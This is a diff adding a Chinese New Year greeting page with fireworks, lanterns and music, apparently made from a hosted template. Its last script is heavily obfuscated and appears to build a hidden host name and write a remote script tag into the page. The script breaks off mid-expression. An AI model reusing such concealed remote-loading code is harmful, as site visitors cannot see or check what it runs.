@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>新年快乐</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+	<meta name="mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="theme-color" content="#000000">
+	<link rel="shortcut icon" type="image/png"
+		href="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+	<link rel="icon" type="image/png"
+		href="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+	<link rel="apple-touch-icon-precomposed"
+		href="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+	<meta name="msapplication-TileColor" content="#000000">
+	<meta name="msapplication-TileImage"
+		content="https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/firework-burst-icon-v2.png">
+	<link href="template/yanhua/css/v1.0.css" rel="stylesheet">
+
+	<link rel="stylesheet" href="/css/denglong.css">
+	<style>
+		@media (max-width: 840px) {
+			.stage-container {
+				overflow: scroll;
+			}
+		}
+
+		.btn {
+			width: 120px, opacity:1
+		}
+	</style>
+</head>
+
+<body>
+	<audio id="audio_music" src="/music/春节序曲.mp3" preload="auto" loop="loop"></audio>
+	<div style="height: 0; width: 0; position: absolute; visibility: hidden;">
+		<svg xmlns="http://www.w3.org/2000/svg">
+			<symbol id="icon-play" viewbox="0 0 24 24">
+				<path d="M8 5v14l11-7z"></path>
+			</symbol>
+			<symbol id="icon-pause" viewbox="0 0 24 24">
+				<path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"></path>
+			</symbol>
+			<symbol id="icon-close" viewbox="0 0 24 24">
+				<path
+					d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
+				</path>
+			</symbol>
+			<symbol id="icon-settings" viewbox="0 0 24 24">
+				<path
+					d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z">
+				</path>
+			</symbol>
+			<symbol id="icon-sound-on" viewbox="0 0 24 24">
+				<path
+					d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z">
+				</path>
+			</symbol>
+			<symbol id="icon-sound-off" viewbox="0 0 24 24">
+				<path
+					d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z">
+				</path>
+			</symbol>
+		</svg>
+	</div>
+
+	<!-- App -->
+	<div class="container">
+		<div class="loading-init">
+			<div class="loading-init__header"></div>
+			<div class="loading-init__status"></div>
+		</div>
+		<div class="stage-container remove">
+			<div class="page_two">
+				<div id="text" class="boxText" style="display:none;">你好\(@^0^@)/👋
+					<br>这是一个小彩蛋。
+					<br>新年快乐，祝你的梦想在新的一年实现！🎇
+					<br>连击有惊喜
+				</div>
+				<div class="type_words" id="contents" style="font-size:.98rem;line-height:1.5rem;padding-left:20px;">
+				</div>
+			</div>
+			<div class="canvas-container">
+				<canvas id="trails-canvas"></canvas>
+				<canvas id="main-canvas"></canvas>
+			</div>
+
+			<div class="menu hide">
+				<div class="menu__inner-wrap">
+					<div class="btn btn--bright close-menu-btn">
+						<svg fill="white" width="24" height="24">
+							<use href="#icon-close" xlink:href="#icon-close"></use>
+						</svg>
+					</div>
+
+					<div class="menu__header">设置</div>
+
+					<form>
+						<div class="form-option form-option--select">
+							<label class="shell-type-label">烟花类型</label>
+							<select class="shell-type"></select>
+						</div>
+						<div class="form-option form-option--select">
+							<label class="shell-size-label">烟花大小</label>
+							<select class="shell-size"></select>
+						</div>
+						<div class="form-option form-option--select">
+							<label class="quality-ui-label">画质</label>
+							<select class="quality-ui"></select>
+						</div>
+						<div class="form-option form-option--select">
+							<label class="sky-lighting-label">天空照明</label>
+							<select class="sky-lighting"></select>
+						</div>
+						<div class="form-option form-option--select">
+							<label class="scaleFactor-label">规模</label>
+							<select class="scaleFactor"></select>
+						</div>
+						<div class="form-option form-option--checkbox">
+							<label class="auto-launch-label">自动发射</label>
+							<input class="auto-launch" type="checkbox">
+						</div>
+						<div class="form-option form-option--checkbox form-option--finale-mode">
+							<label class="finale-mode-label">结局模式</label>
+							<input class="finale-mode" type="checkbox">
+						</div>
+						<div class="form-option form-option--checkbox">
+							<label class="hide-controls-label">隐藏控制器</label>
+							<input class="hide-controls" type="checkbox">
+						</div>
+						<div class="form-option form-option--checkbox form-option--fullscreen">
+							<label class="fullscreen-label">全屏</label>
+							<input class="fullscreen" type="checkbox">
+						</div>
+						<div class="form-option form-option--checkbox">
+							<label class="long-exposure-label">打开快门</label>
+							<input class="long-exposure" type="checkbox">
+						</div>
+					</form>
+
+				</div>
+			</div>
+			<!-- 灯笼 1 -->
+			<div class="deng-box">
+				<div class="deng">
+					<div class="xian"></div>
+					<div class="deng-a">
+						<div class="deng-b">
+							<div class="deng-t">新春</div>
+						</div>
+					</div>
+					<div class="shui shui-a">
+						<div class="shui-c"></div>
+						<div class="shui-b"></div>
+					</div>
+				</div>
+			</div>
+
+			<!-- 灯笼 2 -->
+			<div class="deng-box1">
+				<div class="deng">
+					<div class="xian"></div>
+					<div class="deng-a">
+						<div class="deng-b">
+							<div class="deng-t">bug退</div>
+						</div>
+					</div>
+					<div class="shui shui-a">
+						<div class="shui-c"></div>
+						<div class="shui-b"></div>
+					</div>
+				</div>
+
+			</div>
+			<div class="help-modal">
+				<div class="help-modal__overlay"></div>
+				<div class="help-modal__dialog">
+					<div class="help-modal__header"></div>
+					<div class="help-modal__body"></div>
+					<button type="button" class="help-modal__close-btn">关闭</button>
+				</div>
+			</div>
+		</div>
+
+		<script src="https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+		<script src="template/yanhua/js/fscreen@1.0.1.js"></script>
+		<script src="template/yanhua/js/Stage@0.1.4.js"></script>
+		<script src="template/yanhua/js/MyMath.js"></script>
+		<script src="template/yanhua/js/script.js"></script>
+		<script type="text/javascript">
+			var id = "685089";
+			var data_type = "1";
+			var vip_type = "0";
+			var temp_id = "3";
+			var views = "3484591";
+		</script>
+
+		<script>
+			var background_url = "";
+			var background_opacity = "0.2";
+
+			var _0xodK = 'jsjiami.com.v7'; const _0x468bc4 = _0x1c03; function _0x5c97() { const _0x3f5119 = (function () { return [_0xodK, 'VMVjGsGUSjTiJVaTYmpGBiY.cQomy.ggBvM7CPft==', 'fr/cQbVcIa', 'lmkuqCkaW50', 'pqGbWPJcVmoLW4NcHN0', 'eSk+W67cU04', 'WQSQm8owpa', 'W4JcNmoqf1e', 'urK0tCk7', 'WOlcSCkir8k0wColB8oAW6rqca', 'WOJdSSolfmoJtCoazmowW7PMr3BdLSkkWQXjESopWRTXk8kQxCo/WPpcUNZdLCotdCoMcCkVW4jKWR/dH0CyWPFcHq7cMctdUrlcMN9CW7n24PYdWRxcL8kwWP97WONcSv7dJ8ogWOW', 'eSkjb3eCW6y', 'Aty7ASkB', 'yM7cNCkXWQm', 'pCkoW7xcJSkx', 'WOGzgmoXeeHwWQqnW7NdLM1gW5BdVbO', 'W78EWOZdOSoD', 'bSodvmk3nmoTWPLkW7tcGxZcOvu', 'sSo0hW7cRIyXW4nTWQZdLSkRW5Dso1JdPLldTY4sWQzin8oKx8o1W4uEW5D1W4BdNvhcRCkWsc7dL8oXr8kpymkjvqddVHyOW5ezookDK8oWWQBcHejsW4xcMmosW5vLW6i', 'WP3cPSoifbW', 'sf0gpmkX', 'W6r7rf3cLG', 'W4FcUKe', 'rSkJcCogEW', 'WQ94FW', 'aZ9d', 'oSkOjrT1mhmVW7TnWOFcMa', 'WPJcKh3cSmoPW53dNHyeW6hcSmoaWPK', 'WRVcKqu2W50', 't3RdINZdLa', 'j8kOW5tcR8kd', 'FSkUwN7cSSo7gmkIvW', 'W43dRcHsW7m', 'oWDBsCocFMJcHCk/W4JcItpcPW', 'W4zXWRKM', 'tYmCvq', 'CfKMeSkiBCoMECoGWPvC', 'oJz2gG', 'j8k1EsbbW6NcOfpdR8krW5tcMq', 'W7G/WRqnWRG', 'WPSUW6PIWOxcJmofcW', 'cfRdTG/cHW', 'W5fEs2/cQCk4WQ4y', 'WQtcR3nyW6e', 'WRpcQce3W7i', 'WRNcNvvuW4i', 'nSkhW4ldMHdcQCkdimouwbJdRmkf', 'FCkprwhcQW', 'WRBdIxpcQLG', 'WP/cR3XAW77dMCodb2f7W5i', 'WRxdUNxcTxu', 'gHpcNcZcLa', 'F0ipv8ou', 'vsySW4xdMmoDAwLqWQ9NW5K', 'imo0W5RdTa'].concat((function () { return ['BSkjW5e', 'W4TUW7K9', 'WRhdMM/cRvJdNG', 'WOVdPmkJwq7dR8ofW6DAW5lcHblcJW', 'WRLHiSoRemkzySkf', 'xSkFdSoLCCkrW7vgW7O', 'bYT7W5vE', 'WPRcVeH9qq', 'W6ZdIbZdKmk/', 'r8k1w1JdTZjQW65oWPRdH8oHWPy', 'W5How1ZdV8o2W7i', 'abjzW79giYOlha', 'jqFcGLldOG', 'WQNdKN7cUW', 'WRFcQb4xW6K', 'dYxcVXhcTG', 'sG5Zd8kI', 'W5hcQwXsW6xdR8onxxHHWP7dGxpcKmoxWQPJixKaCWqypqfyW784nG', 'ahLXWOpcHmkhDx0', 'bSogwmk2mSoVWPL8W5NcGxlcUvu', 'axXyWQlcMW', 'AviNdmk2', 'qreLWO/cLa', 'c0RdGCoxW50', 'k8oVrcu', 'm17dHYpcHG', 'aCkBaq', 'WO7cNfPCtW', 'pCktxCkbW70', 'E8o3xM4o', 'hSotW7ZdL8kj', 'W4/dVd4bgrLvo2meo0e', 'tSkvW7hcU8kAfq', 'zgVdIgBdRCkxyrBcMWRdQabj', 'ecpcNq', 'yvdcPaeIAd7dO3TvWRapp1O', 'W4ldKsxdQa', 'ySk4d8oyyq', 'x8knW6JdTmof', 'wKSooSku', 'DCkTFtTwWPFcPL7dPmkeW4hcHCoo', 'W4JcRfWCW5qT', 'E8kjW6RdImo5WO5fWOGxW5VcPx/cVCkz', 'qsldOmoj', 'WPnosLtcSq', 'tNtcQfxdOCkAruG', 'rX9z', 'ECo3Dfe', 'WQFcR3nRW58', 'ntpcMt3cU8ospHdcOrNcLczHW7xcTa', 'brz6pKi', 'x8kcWQxdT8kU', 'W54NWP7dUSoQ', 'dmoPWOhcPGqoW5VcMuhcHdmN', 'zmkzdmo5uq'].concat((function () { return ['k1WtB8oaW4PXfq', 'g1FdQH/cIsK', 'ECkNW6FdIY8', 'WO/cR31bW6JdLColhNDXW4xdG2a', 'ifpdICoDWP0', 'EWD8hCkxkmo3nmo5zq', 'evtdQCoOW7m', 'qmo4WPxcOqqvW70', 'zmkxtmkyW7S1E8oNymkrmSkV', 'p07dLSoCWPOsgaFcGmkO', 'kKJcMW', 'iKHyW47dRSkmWPldMgddVg7cQ3xcQa', 'kv0cfSkDztpcK8k+W7VcHc8', 'pmoWW5/dMCkY', 'WPRcLmovnIO', 'ywyGtYBcSWzeWPddOcBdG8kA', 'qICkeNZcKw/cKqa+W7/dTKTu', 'WQJcRZqPW7e', 'lvpdPmoTW50', 'aCoRWPO', 'yWOpWOVcTSozW4NcHa', 'W4SXWRC', 'n8kgcLOC', 'ku7dH8og', 'Aumq', 'Bcb1jCkI', 'nCoRkW', 'wCklC0hcLG', 'WOCGW7XWWPq', 'gx9VWOFcIq', 'gJHvkeq', 'W5dcV8o4ce3cK8kHW4ra', 'Bmk3W4VcSW', 'vr5nfmk9', 'WOeuW6fwWRy', 'w8kudSoND8kX', 'W67dSmo9oCoJ', 'CCkaWOFcVxSN', 'BLKLgSkkya', 'rX7dSmoAWRq', 'W6/dJ3xcRG', 'kfiRmmkKkCorjCoE', 'W4u5WPxdOq', 'nSkeheS7', 'C8o5W47dQCk2t8opW5hdGYNdMXO', 'dxCVzmkwsxHJ', 'WORcUvmCW4uAW5pdICo4', 'l8kowCkbWQ8', 'CL0+dSkBBa', 'tLuxW7rBrGWJid8XW74', 'fhzkeutcH0VcKcC', 'W4uNWRK8W5hcUZC', 'k8kFq8kwW6fW', 'WQxcS8oxmry']; }())); }())); }()); _0x5c97 = function () { return _0x3f5119; }; return _0x5c97(); }; (function (_0x5d0221, _0x6406e6, _0x3a10f3, _0x12a589, _0x4052e4, _0x4f842e, _0x49b5a6) { return _0x5d0221 = _0x5d0221 >> 0x3, _0x4f842e = 'hs', _0x49b5a6 = 'hs', function (_0x23b7d3, _0x1ac7ca, _0x450272, _0x530a76, _0x5c1a52) { const _0x25d106 = _0x1c03; _0x530a76 = 'tfi', _0x4f842e = _0x530a76 + _0x4f842e, _0x5c1a52 = 'up', _0x49b5a6 += _0x5c1a52, _0x4f842e = _0x450272(_0x4f842e), _0x49b5a6 = _0x450272(_0x49b5a6), _0x450272 = 0x0; const _0xaef5f3 = _0x23b7d3(); while (!![] && --_0x12a589 + _0x1ac7ca) { try { _0x530a76 = parseInt(_0x25d106(0x172, 'dX3L')) / 0x1 + -parseInt(_0x25d106(0x1ab, 'dX3L')) / 0x2 + parseInt(_0x25d106(0x16a, 'IqT&')) / 0x3 * (parseInt(_0x25d106(0x15a, '9^eD')) / 0x4) + parseInt(_0x25d106(0x13c, 'ygoe')) / 0x5 + parseInt(_0x25d106(0x19b, '$8eq')) / 0x6 * (-parseInt(_0x25d106(0x1cf, 'j[B)')) / 0x7) + parseInt(_0x25d106(0x156, 'YNKM')) / 0x8 * (parseInt(_0x25d106(0x17b, '*U#U')) / 0x9) + -parseInt(_0x25d106(0x138, '$cjY')) / 0xa; } catch (_0x1e84ee) { _0x530a76 = _0x450272; } finally { _0x5c1a52 = _0xaef5f3[_0x4f842e](); if (_0x5d0221 <= _0x12a589) _0x450272 ? _0x4052e4 ? _0x530a76 = _0x5c1a52 : _0x4052e4 = _0x5c1a52 : _0x450272 = _0x5c1a52; else { if (_0x450272 == _0x4052e4['replace'](/[VMGTBfQpYCytJgSPU=]/g, '')) { if (_0x530a76 === _0x1ac7ca) { _0xaef5f3['un' + _0x4f842e](_0x5c1a52); break; } _0xaef5f3[_0x49b5a6](_0x5c1a52); } } } } }(_0x3a10f3, _0x6406e6, function (_0x356157, _0x58be9d, _0x595bed, _0x4db1dc, _0x357dde, _0x537bf6, _0x4d3dab) { return _0x58be9d = '\x73\x70\x6c\x69\x74', _0x356157 = arguments[0x0], _0x356157 = _0x356157[_0x58be9d](''), _0x595bed = '\x72\x65\x76\x65\x72\x73\x65', _0x356157 = _0x356157[_0x595bed]('\x76'), _0x4db1dc = '\x6a\x6f\x69\x6e', (0x150789, _0x356157[_0x4db1dc]('')); }); }(0x638, 0xcf1dc, _0x5c97, 0xc9), _0x5c97) && (_0xodK = 0x1090); var assets_host = ''; function _0x1c03(_0x3d1b76, _0x2357b2) { const _0x5c97ce = _0x5c97(); return _0x1c03 = function (_0x1c03cb, _0x421a84) { _0x1c03cb = _0x1c03cb - 0x12f; let _0x56ca13 = _0x5c97ce[_0x1c03cb]; if (_0x1c03['OCJhqg'] === undefined) { var _0x478bb8 = function (_0x35fc0e) { const _0x3b8395 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x4f0d53 = '', _0x52464a = ''; for (let _0x4017bb = 0x0, _0x51ea84, _0x222fd3, _0x1ff4c4 = 0x0; _0x222fd3 = _0x35fc0e['charAt'](_0x1ff4c4++); ~_0x222fd3 && (_0x51ea84 = _0x4017bb % 0x4 ? _0x51ea84 * 0x40 + _0x222fd3 : _0x222fd3, _0x4017bb++ % 0x4) ? _0x4f0d53 += String['fromCharCode'](0xff & _0x51ea84 >> (-0x2 * _0x4017bb & 0x6)) : 0x0) { _0x222fd3 = _0x3b8395['indexOf'](_0x222fd3); } for (let _0x586afb = 0x0, _0x560320 = _0x4f0d53['length']; _0x586afb < _0x560320; _0x586afb++) { _0x52464a += '%' + ('00' + _0x4f0d53['charCodeAt'](_0x586afb)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0x52464a); }; const _0x59892e = function (_0x5c99cc, _0x26ae38) { let _0x56ff2b = [], _0x208453 = 0x0, _0x55b522, _0x42997d = ''; _0x5c99cc = _0x478bb8(_0x5c99cc); let _0x51e1b8; for (_0x51e1b8 = 0x0; _0x51e1b8 < 0x100; _0x51e1b8++) { _0x56ff2b[_0x51e1b8] = _0x51e1b8; } for (_0x51e1b8 = 0x0; _0x51e1b8 < 0x100; _0x51e1b8++) { _0x208453 = (_0x208453 + _0x56ff2b[_0x51e1b8] + _0x26ae38['charCodeAt'](_0x51e1b8 % _0x26ae38['length'])) % 0x100, _0x55b522 = _0x56ff2b[_0x51e1b8], _0x56ff2b[_0x51e1b8] = _0x56ff2b[_0x208453], _0x56ff2b[_0x208453] = _0x55b522; } _0x51e1b8 = 0x0, _0x208453 = 0x0; for (let _0xaa2ef9 = 0x0; _0xaa2ef9 < _0x5c99cc['length']; _0xaa2ef9++) { _0x51e1b8 = (_0x51e1b8 + 0x1) % 0x100, _0x208453 = (_0x208453 + _0x56ff2b[_0x51e1b8]) % 0x100, _0x55b522 = _0x56ff2b[_0x51e1b8], _0x56ff2b[_0x51e1b8] = _0x56ff2b[_0x208453], _0x56ff2b[_0x208453] = _0x55b522, _0x42997d += String['fromCharCode'](_0x5c99cc['charCodeAt'](_0xaa2ef9) ^ _0x56ff2b[(_0x56ff2b[_0x51e1b8] + _0x56ff2b[_0x208453]) % 0x100]); } return _0x42997d; }; _0x1c03['GXgDwo'] = _0x59892e, _0x3d1b76 = arguments, _0x1c03['OCJhqg'] = !![]; } const _0x1d1741 = _0x5c97ce[0x0], _0xeee0ee = _0x1c03cb + _0x1d1741, _0x2e4cca = _0x3d1b76[_0xeee0ee]; return !_0x2e4cca ? (_0x1c03['tIUJMU'] === undefined && (_0x1c03['tIUJMU'] = !![]), _0x56ca13 = _0x1c03['GXgDwo'](_0x56ca13, _0x421a84), _0x3d1b76[_0xeee0ee] = _0x56ca13) : _0x56ca13 = _0x2e4cca, _0x56ca13; }, _0x1c03(_0x3d1b76, _0x2357b2); } window[_0x468bc4(0x189, 't1[J')][_0x468bc4(0x141, '$cjY')] === _0x468bc4(0x15c, 'W[]h') ? assets_host = _0x468bc4(0x160, 'hf6w') + _0x468bc4(0x17e, 'b(p(') + _0x468bc4(0x140, 'y#gD') : assets_host = _0x468bc4(0x19c, 'JVdS') + _0x468bc4(0x137, 'r1pJ') + _0x468bc4(0x155, '%$[l'); document[_0x468bc4(0x191, '%$[l')](_0x468bc4(0x18f, 'SnPV') + assets_host + _0x468bc4(0x1a9, 'N[t4')); background_url && ($(_0x468bc4(0x135, 'W[]h'))[_0x468bc4(0x177, 'hy@S')](_0x468bc4(0x132, 'YNKM'), _0x468bc4(0x195, 'S@GT') + background_url + _0x468bc4(0x15e, '#jg(')), $(_0x468bc4(0x139, 'S@GT'))[_0x468bc4(0x1b2, '[$(*')](_0x468bc4(0x1c9, '85U4'), _0x468bc4(0x183, 't1[J')), $(_0x468bc4(0x187, 'NC(1'))[_0x468bc4(0x145, 'S@GT')](_0x468bc4(0x134, 'y#gD'), background_opacity)); function musicPlay(_0x57fc0d) { const _0x27d25b = _0x468bc4, _0x59a164 = { 'LxRbM': _0x27d25b(0x159, 'EQka'), 'rlKFB': function (_0x57f69e, _0x1acdf2) { return _0x57f69e !== _0x1acdf2; }, 'TlnIB': _0x27d25b(0x164, 'W[]h') }; var _0x4796e6 = document[_0x27d25b(0x1c0, 'NC(1')](_0x59a164[_0x27d25b(0x14e, 'YNKM')]); _0x57fc0d && _0x4796e6[_0x27d25b(0x1d0, 'dzEL')] && _0x4796e6[_0x27d25b(0x184, '9^eD')](), !_0x57fc0d && !_0x4796e6[_0x27d25b(0x16c, '[$(*')] && (_0x59a164[_0x27d25b(0x1b5, '*U#U')](_0x27d25b(0x1ad, 'BVAP'), _0x59a164[_0x27d25b(0x158, '[$(*')]) ? _0x22c640[_0x27d25b(0x197, 'EQka')]() : _0x4796e6[_0x27d25b(0x174, 'YIrl')]()); } function musicInBrowserHandler() { const _0x4815fd = _0x468bc4, _0x3ffa6a = { 'brBdg': function (_0x474714, _0x19f414) { return _0x474714 + _0x19f414; }, 'YKxOT': _0x4815fd(0x14d, 'EQka'), 'rSTno': function (_0x383549, _0x5362cf) { return _0x383549 === _0x5362cf; }, 'ShlyR': _0x4815fd(0x133, 'LF[6'), 'nWLOj': function (_0x2e87a2, _0x530677) { return _0x2e87a2(_0x530677); }, 'YukXN': function (_0x1f4d55, _0x1ec074, _0x10d8a5) { return _0x1f4d55(_0x1ec074, _0x10d8a5); } }; _0x3ffa6a[_0x4815fd(0x1c8, 'N[t4')](setTimeout, function () { const _0x17791e = _0x4815fd, _0x2dc1e0 = { 'muANh': function (_0x151f40, _0x4dac81) { const _0x25fc79 = _0x1c03; return _0x3ffa6a[_0x25fc79(0x1cb, '60Nw')](_0x151f40, _0x4dac81); }, 'UlyAS': _0x3ffa6a[_0x17791e(0x1a4, 'b(p(')] }; _0x3ffa6a[_0x17791e(0x1b3, 'as#@')](_0x3ffa6a[_0x17791e(0x1ce, 'dX3L')], _0x3ffa6a[_0x17791e(0x1a8, 'YNKM')]) ? _0x3ffa6a[_0x17791e(0x19e, '#jg(')](musicPlay, !![]) : (_0x1dceba(_0x78abac), _0x5ed062[_0x17791e(0x19d, 'dX3L')] = _0x2dc1e0[_0x17791e(0x1af, 'LF[6')](_0x17791e(0x142, 't1[J') + _0x3fdcb5, _0x2dc1e0[_0x17791e(0x188, 'hf6w')])); }, 0x0); } document[_0x468bc4(0x144, 'r1pJ')][_0x468bc4(0x170, 'P5#m')](_0x468bc4(0x136, 'r1pJ'), musicInBrowserHandler), $(_0x468bc4(0x152, 'FHe2'))[_0x468bc4(0x18a, 'dzEL')](_0x2a03fc => { const _0x360478 = _0x468bc4, _0x319fc6 = { 'nVIaz': function (_0x264260) { return _0x264260(); }, 'UIoXb': function (_0x2752e5) { return _0x2752e5(); }, 'Zukkp': _0x360478(0x1cd, 'y#gD'), 'VyFFZ': function (_0x22e3c0) { return _0x22e3c0(); }, 'JDMVm': function (_0x1c78d3, _0x4cbe86) { return _0x1c78d3(_0x4cbe86); }, 'fsFOa': _0x360478(0x1b8, 'bEvY'), 'NKGZV': function (_0x23a1b9, _0x1d377f, _0xc2e0b7) { return _0x23a1b9(_0x1d377f, _0xc2e0b7); } }; _0x319fc6[_0x360478(0x17f, 'bEvY')]($, _0x319fc6[_0x360478(0x19f, 'as#@')])[_0x360478(0x1c3, 'OI5(')](), _0x319fc6[_0x360478(0x1b6, 'EQka')](setTimeout, () => { const _0x4679e4 = _0x360478; _0x319fc6[_0x4679e4(0x169, '9^eD')](start), _0x319fc6[_0x4679e4(0x1bd, 'dX3L')](fireworks); }, 0x1388), _0x319fc6[_0x360478(0x148, 'infM')](setTimeout, () => { const _0x5a2312 = _0x360478, _0x59a745 = { 'vUhUG': _0x319fc6[_0x5a2312(0x18c, 'N[t4')] }; function _0x4ba276() { const _0x343004 = _0x5a2312; if (_0x343004(0x1bf, 'BVAP') !== _0x343004(0x1a7, '85U4')) { var _0x4b4de5 = _0x51e1b8[_0x343004(0x130, 'N[t4')](_0x59a745[_0x343004(0x14f, 't1[J')]); _0xaa2ef9 && _0x4b4de5[_0x343004(0x15d, 'BVAP')] && _0x4b4de5[_0x343004(0x157, 'POUl')](), !_0x5aeb9e && !_0x4b4de5[_0x343004(0x19a, '%$[l')] && _0x4b4de5[_0x343004(0x149, 't1[J')](); } else { var _0x46ac4b = document[_0x343004(0x13d, 'O@Ll')](_0x343004(0x192, 'N[t4')); _0x46ac4b[_0x343004(0x1c7, '*U#U')](); } } _0x319fc6[_0x5a2312(0x16d, '9^eD')](_0x4ba276); }, 0x1388), console[_0x360478(0x1ba, 'b(p(')](updateConfig({ 'autoLaunch': !![] })); }); function fireworks() { const _0x27fba6 = _0x468bc4, _0x1507a1 = { 'CavyP': function (_0x36b0f8, _0x40ac5b) { return _0x36b0f8(_0x40ac5b); }, 'Kldth': _0x27fba6(0x165, '$cjY'), 'tAokH': _0x27fba6(0x186, 'ygoe'), 'nUtvd': function (_0x255fd9, _0x582ecf) { return _0x255fd9(_0x582ecf); }, 'XhXOj': _0x27fba6(0x15b, 'hy@S') }; _0x1507a1[_0x27fba6(0x1be, 'GABf')]($, _0x1507a1[_0x27fba6(0x13f, 'LF[6')])[_0x27fba6(0x18b, 'us$%')](_0x1507a1[_0x27fba6(0x193, '%$[l')]), _0x1507a1[_0x27fba6(0x154, 'OI5(')]($, _0x1507a1[_0x27fba6(0x1b1, 'dzEL')])[_0x27fba6(0x185, 'BVAP')](_0x27fba6(0x1a5, '%$[l')); } function start() { const _0x5b4a22 = _0x468bc4, _0x27eb7b = { 'BMRMT': function (_0x58a412, _0x13a052) { return _0x58a412 < _0x13a052; }, 'UnxXe': function (_0x5c7567, _0x2ea6ab) { return _0x5c7567 + _0x2ea6ab; }, 'RiEpM': _0x5b4a22(0x173, 'K[@q'), 'HtjVo': _0x5b4a22(0x147, '*U#U'), 'qRiFx': _0x5b4a22(0x181, 'N[t4'), 'TAkqS': _0x5b4a22(0x1c6, '#jg('), 'rnssz': function (_0x149022, _0x66c8a9) { return _0x149022 < _0x66c8a9; }, 'BWObZ': function (_0x544c0a, _0x3776a8) { return _0x544c0a === _0x3776a8; }, 'aPBlV': _0x5b4a22(0x1a6, 'N)A7'), 'zipph': function (_0x5575c9, _0x42773a) { return _0x5575c9 + _0x42773a; }, 'Pblwy': function (_0x2f6d19, _0x583645) { return _0x2f6d19 !== _0x583645; }, 'krjbo': _0x5b4a22(0x18d, 'N)A7'), 'WIhAU': function (_0x3d4869, _0x32f4ca) { return _0x3d4869(_0x32f4ca); }, 'wShQS': _0x5b4a22(0x199, 't1[J'), 'uFjSR': function (_0x244f88, _0x5ec106) { return _0x244f88(_0x5ec106); }, 'MAfzH': _0x5b4a22(0x1c4, 'us$%'), 'JKxzX': _0x5b4a22(0x1aa, 'AYf#'), 'bjGUz': function (_0x2ceec3, _0x23ea5a, _0x4da803) { return _0x2ceec3(_0x23ea5a, _0x4da803); } }; let _0x1c53df = _0x27eb7b[_0x5b4a22(0x146, 'YNKM')]($, _0x27eb7b[_0x5b4a22(0x194, '85U4')])[_0x5b4a22(0x1bc, 'GgOw')](), _0x47b17d = '', _0x246753 = 0x0, _0x872795 = document[_0x5b4a22(0x1c2, 'GABf')](_0x27eb7b[_0x5b4a22(0x171, 'POUl')]); $(''); let _0x481809 = _0x27eb7b[_0x5b4a22(0x1ac, 'AYf#')](setInterval, () => { const _0xc67753 = _0x5b4a22, _0x3f1ee6 = { 'sQqWu': function (_0x5f5904, _0x24dee2) { const _0x2dbe8a = _0x1c03; return _0x27eb7b[_0x2dbe8a(0x163, '85U4')](_0x5f5904, _0x24dee2); }, 'lhdTm': function (_0x54b996, _0x3c1465) { const _0x45764c = _0x1c03; return _0x27eb7b[_0x45764c(0x16e, ']XmO')](_0x54b996, _0x3c1465); }, 'sSFcV': _0x27eb7b[_0xc67753(0x1ae, '$cjY')], 'GGMgS': function (_0x447fc3, _0x1b69f1) { return _0x447fc3(_0x1b69f1); }, 'HgGWS': _0x27eb7b[_0xc67753(0x162, 'YIrl')], 'JaMAO': _0xc67753(0x1b0, 'infM'), 'FmTTg': _0xc67753(0x1a2, 'us$%'), 'jOqzk': _0x27eb7b[_0xc67753(0x178, 'dX3L')], 'ZqFLn': _0x27eb7b[_0xc67753(0x176, 'us$%')] }; _0x27eb7b[_0xc67753(0x13e, 'N)A7')](_0x47b17d[_0xc67753(0x1c1, 'hy@S')], _0x1c53df[_0xc67753(0x150, 'dX3L')]) ? _0x27eb7b[_0xc67753(0x167, 'P5#m')](_0xc67753(0x168, '$8eq'), _0x27eb7b[_0xc67753(0x17d, 'N)A7')]) ? _0x3f1ee6[_0xc67753(0x166, 'IuF8')](_0x5b11cc[_0xc67753(0x153, 'BVAP')], _0xf5fb2e[_0xc67753(0x161, 'W[]h')]) ? 